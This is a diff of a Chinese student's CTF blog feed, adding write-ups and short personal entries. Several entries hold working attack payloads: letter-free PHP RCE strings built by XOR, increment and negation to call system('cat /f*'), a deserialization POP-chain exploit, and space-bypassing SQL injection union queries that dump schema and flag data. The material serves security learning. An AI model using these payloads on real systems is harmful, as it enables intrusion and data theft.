-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>图片测试： </p>
-<img src="/2025/02/11/my-first-blog/%E5%A4%B4%E5%83%8F.jpg" class="" title="头像">
-
-<p>引用测试：</p>
-<blockquote>
-<p>这是一条引用 </p>
-</blockquote>
-<h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p>
-<ul>
-<li>哈哈 </li>
-<li><ul>
-<li>嘿嘿 </li>
-<li>吼吼</li>
-</ul>
-</li>
-</ul>
-<h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><p>home_cover:![头像](my-first-blog&#x2F;头像.jpg</p>
-<p>categories:”index”</p>
-<p>tags:test<br>sticky:2</p>
+    <title>[DownUnderCTF 2022]no_symlink</title>
+    <url>/2025/02/22/DownUnderCTF-2022-no-symlink/</url>
+    <content><![CDATA[<p>看不懂，跪了</p>
+<p><a href="https://lebr0nli.github.io/blog/security/DownUnderCTF-2022/#no-symlink-web">https://lebr0nli.github.io/blog/security/DownUnderCTF-2022/#no-symlink-web</a></p>
+<p><a href="http://blog.maple3142.net/2022/09/25/downunderctf-2022-writeups/#no-symlink">http://blog.maple3142.net/2022/09/25/downunderctf-2022-writeups/#no-symlink</a></p>
+<p><a href="https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/#no-symlink-Symlink-and-file-permission-trick">https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/#no-symlink-Symlink-and-file-permission-trick</a></p>
 ]]></content>
       <categories>
-        <category>Index</category>
+        <category>Web</category>
       </categories>
       <tags>
-        <tag>First</tag>
-        <tag>Test</tag>
+        <tag>不懂</tag>
       </tags>
   </entry>
   <entry>
@@ -822,6 +641,148 @@
       </tags>
   </entry>
   <entry>
+    <title>CS入门黑话收集</title>
+    <url>/2025/02/21/CS%E5%85%A5%E9%97%A8%E9%BB%91%E8%AF%9D%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<p>此为个人理解，争取往大白话，口语化方向看齐。</p>
+<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><h1 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h1><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><h1 id="CMD指纹"><a href="#CMD指纹" class="headerlink" title="CMD指纹"></a>CMD指纹</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h1 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h1><p>没有被公开发表的漏洞。也就是说你做这道题不可以查已经发表的CVE来复现得到flag。</p>
+<h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><h1 id="webshell-shell-web"><a href="#webshell-shell-web" class="headerlink" title="webshell shell web"></a>webshell shell web</h1><h1 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie session token"></a>cookie session token</h1><h1 id="jwt-js"><a href="#jwt-js" class="headerlink" title="jwt js"></a>jwt js</h1><p>JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">Payload</span>.<span class="property">Signature</span></span><br></pre></td></tr></table></figure>
+
+<p>长这样：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;姓名&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="string">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line">  <span class="string">&quot;到期时间&quot;</span>: <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="结"><a href="#结" class="headerlink" title="结"></a>结</h3><table>
+<thead>
+<tr>
+<th align="left">部分</th>
+<th align="left">是否可解码？</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Header</td>
+<td align="left">✅ 可解码</td>
+<td align="left">声明算法和类型</td>
+</tr>
+<tr>
+<td align="left">Payload</td>
+<td align="left">✅ 可解码</td>
+<td align="left">携带实际数据（如用户信息）</td>
+</tr>
+<tr>
+<td align="left">Signature</td>
+<td align="left">❌ 不可解码</td>
+<td align="left">验证 Token 的合法性</td>
+</tr>
+</tbody></table>
+<p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CS自学指南笔记</title>
+    <url>/2025/02/21/CS%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提问的智慧</a></p>
+<p><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">命令行的艺术</a></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《计网自顶向下》你记得什么都默下来</title>
+    <url>/2025/02/20/%E3%80%8A%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E3%80%8B%E4%BD%A0%E8%AE%B0%E5%BE%97%E4%BB%80%E4%B9%88%E9%83%BD%E9%BB%98%E4%B8%8B%E6%9D%A5/</url>
+    <content><![CDATA[]]></content>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[HUBUCTF 2022 新生赛]HowToGetShell</title>
+    <url>/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/</url>
+    <content><![CDATA[<p>其实本来是想取反绕过的，但是没反应也没有触发过滤，就很奇怪，理论上能在本地跑个源代码，但是为啥跑出来是源代码呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$mess=&#x27;(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);&#x27;;</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure>
+
+<p>deepseek稍后再试，豆包法律风险，GPT开着代理还说两句就不理人，kimi销声匿迹，文心一言不语知识一昧的说有法律风险，你们五个真的是 让我选不出来一个</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span>    <span class="comment">#可以过的字母</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(tmp1,tmp2)</span><br></pre></td></tr></table></figure>
+
+<p>偷个脚本</p>
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0302181    @[@[_^^</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>明天要在平板上远程控制问的问题：</p>
+<h1 id="是什么？"><a href="#是什么？" class="headerlink" title="$_ ;$_(); 是什么？"></a>$_ ;$_(); 是什么？</h1>]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>取反绕过</tag>
+        <tag>异或绕过</tag>
+        <tag>无字母RCE</tag>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>我有巨物恐惧症</title>
+    <url>/2025/02/19/%E6%88%91%E6%9C%89%E5%B7%A8%E7%89%A9%E6%81%90%E6%83%A7%E7%97%87/</url>
+    <content><![CDATA[<p>我不明白怎么有这么多工具这么多命令这么多魔术方法</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>[NCTF 2018]滴!晨跑打卡</title>
+    <url>/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/</url>
+    <content><![CDATA[<p>SQL注入<img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png" class="" title="QQ20250219-171610"></p>
+<p>FUZZ看屏蔽什么</p>
+<h1 id="空格-a0"><a href="#空格-a0" class="headerlink" title="空格 %a0"></a>空格 %a0</h1><h1 id="‘’-27"><a href="#‘’-27" class="headerlink" title="‘’ %27"></a>‘’ %27</h1><img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-174605.png" class="" title="QQ20250219-174605">
+
+<p>发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）</p>
+<blockquote>
+<p>2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合<br>3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，3<br>4、查库名：1%27%a0union%a0select%a01,2,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),4%27<br>5、查表名：1%27%a0union%a0select%a01,2,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema&#x3D;database()),4%27<br>6、查列名：1%27%a0union%a0select%a01,2,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name&#x3D;‘pcnumber’),4%27 (报错)<br>7、查字段值：1%27%a0union%a0select%a01,2,(select%a0group_concat(flag)%a0from%a0pcnumber),4%27</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>报错注入</tag>
+        <tag>空格绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>永远追不上的时间</title>
+    <url>/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/</url>
+    <content><![CDATA[<p>12.20下课</p>
+<p>13.00吃完麦当劳 走路回宿舍</p>
+<p>玩了一会儿手机，头不太舒服，睡了一会儿（本来只想咪到2点）</p>
+<p>15.00醒了，穿衣服，下楼洗澡</p>
+<p>15.40洗完了（没洗头所以不用吹头发）烧水，玩了五分钟NS</p>
+<p>16.10出门吃饭，瓦香鸡等了十分钟，</p>
+<p>16.57 到俱乐部，写博客</p>
+<p>实际上这已经是非常非常避开人流的作息了…如果不要求自己下午一定要来电脑面前一会儿就好很多…但是还有晚自习晚上只能学一个小时QAQ</p>
+]]></content>
+      <categories>
+        <category>Index</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>NPC²CTF_部分WP</title>
+    <url>/2025/02/17/NPC%C2%B2CTF-%E9%83%A8%E5%88%86WP/</url>
+    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phone</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">please</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wake</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">up</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">me</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>,<span class="variable">$d</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phone</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phone</span>();</span><br><span class="line"><span class="variable">$phone</span>-&gt;a = <span class="variable">$rce</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$wake</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wake</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$up</span> = <span class="keyword">new</span> <span class="title function_ invoke__">up</span>();</span><br><span class="line"><span class="variable">$dummy</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;a = &amp;<span class="variable">$dummy</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;b = &amp;<span class="variable">$dummy</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;c = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> <span class="title function_ invoke__">me</span>();</span><br><span class="line"><span class="variable">$me</span>-&gt;a = <span class="variable">$wake</span>;</span><br><span class="line"><span class="variable">$me</span>-&gt;b = <span class="variable">$up</span>;</span><br><span class="line"><span class="variable">$me</span>-&gt;c = [<span class="number">2</span> =&gt; [<span class="variable">$phone</span>, <span class="string">&#x27;test&#x27;</span>]];</span><br><span class="line"><span class="variable">$me</span>-&gt;d = <span class="string">&#x27;wakeup&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$please</span> = <span class="keyword">new</span> <span class="title function_ invoke__">please</span>();</span><br><span class="line"><span class="variable">$please</span>-&gt;a = <span class="variable">$me</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$please</span>));<span class="comment">#这里要记得url编码QAQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#$rce中是用于rce的代码，用自增、取反、异或构造出形如system()即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#汉字取反(感谢选手lzz0403 QAQ</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27; $_++;</span></span><br><span class="line"><span class="string">$__ = &quot;牥&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;瞑&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;獡&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;砏&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;盔&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;犤&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;璜&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;珟&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$____ = &quot;癖&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;疘&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;瓛&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;皕&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$______ = &quot;癖&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瓛&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瞑&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瘗&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$___($_____(&quot;/&quot;.$_______));</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#这是自增，记得去掉注释</span></span><br><span class="line"><span class="variable">$rce</span>=<span class="string">&#x27;$_=[];</span></span><br><span class="line"><span class="string">$_=@&quot;$_&quot;;</span></span><br><span class="line"><span class="string">$__=$_[&quot;[&quot;==&quot;]&quot;];</span></span><br><span class="line"><span class="string">$___=$_[&quot;[&quot;==&quot;[&quot;];</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;</span></span><br><span class="line"><span class="string">$____=$__^$___;</span></span><br><span class="line"><span class="string">$____--;</span></span><br><span class="line"><span class="string">$___=$_[$____];</span></span><br><span class="line"><span class="string">$____++;</span></span><br><span class="line"><span class="string">$_____=$___;#a</span></span><br><span class="line"><span class="string">$___++;$___++;#c</span></span><br><span class="line"><span class="string">$_____=$___.$_____;#ca</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;#f</span></span><br><span class="line"><span class="string">$______=&quot; /&quot;.$___.&quot;*&quot;;# /f*</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;#t</span></span><br><span class="line"><span class="string">$_____=$_____.$___;#cat</span></span><br><span class="line"><span class="string">$_____=$_____.$______;#cat /f*</span></span><br><span class="line"><span class="string">$__++;$__++;#C</span></span><br><span class="line"><span class="string">$__++;$__++;#E</span></span><br><span class="line"><span class="string">$________=$__;#E</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;#H</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;#M</span></span><br><span class="line"><span class="string">$________=$________.$__;#EM</span></span><br><span class="line"><span class="string">$__++;$__++;#O</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="string">$_________=$__;#S</span></span><br><span class="line"><span class="string">$__++;</span></span><br><span class="line"><span class="string">$________=$__.$________;#TEM</span></span><br><span class="line"><span class="string">$________=$_________.$________;#STEM</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="string">$________=$_________.$__.$________;#SYSTEM</span></span><br><span class="line"><span class="string">$________($_____);</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>VNCTF 面试问题汇总答案</title>
     <url>/2025/02/16/VNCTF-%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%E7%AD%94%E6%A1%88/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -838,156 +799,55 @@
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
-    <title>test for next</title>
-    <url>/2025/02/25/test-for-next/</url>
-    <content><![CDATA[<p>561695156</p>
-]]></content>
-      <categories>
-        <category>why no categories</category>
-      </categories>
-      <tags>
-        <tag>why no tag</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[NISACTF 2022]midlevel</title>
-    <url>/2025/02/26/%C2%96NISACTF-2022-midlevel/</url>
-    <content><![CDATA[<img src="/2025/02/26/%C2%96NISACTF-2022-midlevel/QQ20250226-213100.png" class="" title="QQ20250226-213100">
+    <title>[HNCTF 2022 WEEK4]pop子和pipi美</title>
+    <url>/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/</url>
+    <content><![CDATA[<img src="/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/QQ20250215-200622.png" class="" title="QQ20250215-200622">
 
-<h1 id="大概流程："><a href="#大概流程：" class="headerlink" title="大概流程："></a>大概流程：</h1><p>发现是smarty，在xff注入，查看文件，执行命令</p>
-<h1 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h1>]]></content>
-  </entry>
-  <entry>
-    <title>[FSCTF 2023]base套</title>
-    <url>/2025/02/28/%C2%96FSCTF-2023-base%E5%A5%97/</url>
-    <content><![CDATA[<p>这个题目是给了一个很多次base64编码，每一次还会加上中文前缀的结果，要求解码</p>
-<p>主要任务是写一个脚本</p>
-<p>下面是我写的极简脚本~~~</p>
-<span id="more"></span>
+<img src="/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/QQ20250215-200707.png" class="" title="QQ20250215-200707">
 
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">b64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b64 = re.sub(<span class="string">r&#x27;flag|[一-龥]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, b64) <span class="comment"># 语法不熟</span></span><br><span class="line">        decoded_b64 = b64decode(b64)</span><br><span class="line">        <span class="keyword">return</span> decoded_b64.decode(),<span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> b64,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file: <span class="comment"># 现在会啦</span></span><br><span class="line">     flag = file.read()</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">         flag,can_decode = base64_decode(flag)</span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> can_decode:</span><br><span class="line">             <span class="built_in">print</span>(flag)</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Misc</category>
-      </categories>
-      <tags>
-        <tag>字符编码</tag>
-        <tag>编码分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[陇剑杯 2021]日志分析（问1）+jwt（问2）</title>
-    <url>/2025/02/22/%C2%96%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="日志分析（问1）"><a href="#日志分析（问1）" class="headerlink" title="日志分析（问1）"></a>日志分析（问1）</h1><p>把日志用010打开，搜索200<br><img src="https://www.nssctf.cn/files/2023/9/25/3eecd8b87f.jpg" alt="NSSIMAGE"><br>看到一个下载www%2ezip的，%2e在十六进制表示.，所以源文件是<a href="http://www.zip/">www.zip</a></p>
-<h1 id="jwt（问2）"><a href="#jwt（问2）" class="headerlink" title="jwt（问2）"></a>jwt（问2）</h1><p>题目说攻击者是进行了绕过的，流量里登录了两遍，登陆之后执行whoami都是失败的，返回权限不足，下面第三遍执行whoami时突然成功了，结合查到<img src="/%C2%96%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/QQ20250222-140947.png" alt="QQ20250222-140947">的jwt绕过方法，攻击者是修改tocken值进行<img src="/%C2%96%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/QQ20250222-140911.png" alt="QQ20250222-140911">绕过的，将原本10086的id改为了10087，获取到了管理员权限</p>
-]]></content>
-      <categories>
-        <category>Misc</category>
-      </categories>
-      <tags>
-        <tag>流量分析</tag>
-        <tag>Webshell流量</tag>
-        <tag>日志审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[SWPUCTF 2021 新生赛]fakerandom </title>
-    <url>/2025/02/25/%C2%96SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-fakerandom/</url>
-    <content><![CDATA[<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    l.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line">result=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line">    random.seed(l[i])</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        result.append(<span class="built_in">ord</span>(flag[i*<span class="number">5</span>+n])^random.getrandbits(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244]</span></span><br></pre></td></tr></table></figure>
+<p>我会老实交代我是看wp知道传入参数的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag is in f14g.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">POP_TEAM_EPIC</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$WEBSITE</span>  = <span class="string">&quot;MANGA LIFE WIN&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;No_893);                   <span class="comment">#2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$anti_takeshobo</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$anti_takeshobo</span>);                       <span class="comment">#1 这里是pop链最后一步 要include f14g.php,了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PIPIPMI</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="string">&quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pipi美永远不会生气ww&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pipi = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$corepop</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();                              <span class="comment">#3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span 